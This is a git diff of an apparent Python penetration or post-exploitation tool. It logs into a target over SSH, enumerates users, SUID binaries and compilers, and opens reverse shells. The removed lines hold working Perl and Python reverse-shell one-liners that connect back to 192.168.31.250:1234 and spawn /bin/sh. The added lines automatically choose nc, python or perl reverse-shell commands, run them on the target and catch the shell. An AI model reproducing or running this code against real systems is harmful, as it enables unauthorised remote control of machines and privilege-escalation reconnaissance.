@@ -1,12 +1,10 @@
 import socket
-import sys
 import click
 import paramiko
 import re
-import threading
-from PyInquirer import prompt
-from examples import custom_style_2
+from PyInquirer.prompt import prompt
 from termcolor import colored
+from reverse_shell import communicate, setup_server, nc_reverse_shell_cmds, python_reverse_shell_cmds, perl_reverse_shell_cmds
 from password import credential_scan
 from utils import find_suid_binaries, check_useful_binaries, check_compiler
 from helper.questions import ssh_question
@@ -22,13 +20,12 @@ def ssh_connect(ip, port, username, password):
     print('\n----------------------------------------------------\n')
     nextQuestion = True
     while nextQuestion:
-        answer = prompt(ssh_question(), style=custom_style_2).get('scan')
+        answer = prompt(ssh_question()).get('scan')
         if answer == 'user list':
             stdin, stdout, stderr = ssh.exec_command(
                 'getent passwd | awk -F: \'{ print $1}\'')
             outlines = stdout.readlines()
             if len(outlines) > 0:
-                print(colored('User list: \n', attrs=['bold']))
                 for user in outlines:
                     click.echo(user.replace('\n', ''))
                 print('\n----------------------------------------------------\n')
@@ -36,7 +33,6 @@ def ssh_connect(ip, port, username, password):
             stdin, stdout, stderr = ssh.exec_command(find_suid_binaries(ip))
             outlines = stdout.readlines()
             if len(outlines) > 0:
-                print(colored('SUID Binaries: \n', attrs=['bold']))
                 for path in outlines:
                     print(path.replace('\n', ''))
                 print('\n----------------------------------------------------\n')
@@ -44,7 +40,6 @@ def ssh_connect(ip, port, username, password):
             stdin, stdout, stderr = ssh.exec_command(check_useful_binaries(ip))
             outlines = stdout.readlines()
             if len(outlines) > 0:
-                print(colored('Useful binaries: \n',  attrs=['bold']))
                 for binary in outlines:
                     print(binary.replace('\n', ''))
                 print('\n----------------------------------------------------\n')
@@ -52,7 +47,6 @@ def ssh_connect(ip, port, username, password):
             stdin, stdout, stderr = ssh.exec_command(check_compiler(ip))
             outlines = stdout.readlines()
             if len(outlines) > 0:
-                print(colored('Available compilers: \n', attrs=['bold']))
                 compilers = []
                 for compiler in outlines:
                     compilers.append(compiler.replace('\n', '').split(' '))
@@ -67,36 +61,35 @@ def ssh_connect(ip, port, username, password):
                     print(compiler)
                 print('\n----------------------------------------------------\n')
         elif answer == 'reverse shell':
-            def send_commands(conn):
-                while True:
-                    cmd = input()
-                    if cmd == 'quit':
-                        conn.close()
-                        server.close()
-                        sys.exit()
-                    if len(str.encode(cmd)) > 0:
-                        conn.send(str.encode(cmd))
-                        client_response = str(conn.recv(1024), "utf-8")
-                        print(client_response, end="")
-            # 2
-            bind_ip = '0.0.0.0'
-            bind_port = 1234
-            serv_add = (bind_ip, bind_port)
-            # 3
-            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server.bind((serv_add))
-            server.listen(5)
-            print("[*] listening on {}:{}".format(bind_ip, bind_port))
-            #ssh.exec_command('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.250",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' &')
-            ssh.exec_command(
-                'perl -e \'use Socket;$i="192.168.31.250";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'')
-            # 4
-            conn, addr = server.accept()
-            print('accepted connection from {} and port {}'.format(
-                addr[0], addr[1]))
-            print("enter the commands below")
-            # 5
-            send_commands(conn)
+            stdin, stdout, stderr = ssh.exec_command(check_useful_binaries(ip))
+            outlines = stdout.readlines()
+            useful_binaries = []
+            if len(outlines) > 0:
+                ip = '0.0.0.0'
+                port = 5559
+                server = setup_server(ip, port)
+                local_ip = socket.gethostbyname_ex(socket.gethostname())[-1][0]
+                for binary in outlines:
+                    if 'not found' not in binary:
+                        useful_binaries.append(binary.replace('\n', ''))
+                
+                cmds = []
+
+                for binary in useful_binaries:
+                    if 'nc' in binary or 'netcat' in binary:
+                        cmds = nc_reverse_shell_cmds(local_ip, port) 
+                        break
+                    elif 'python' in binary:
+                        cmds = python_reverse_shell_cmds(local_ip, port)
+                        break
+                    elif 'perl' in binary:
+                        cmds = perl_reverse_shell_cmds(local_ip, port)
+                        break
+                
+                for cmd in cmds:
+                    ssh.exec_command(cmd)
+                    communicate(server)
+                    break
         elif answer == 'available credentials':
             stdin, stdout, stderr = ssh.exec_command(find_suid_binaries(ip))
             outlines = stdout.readlines()
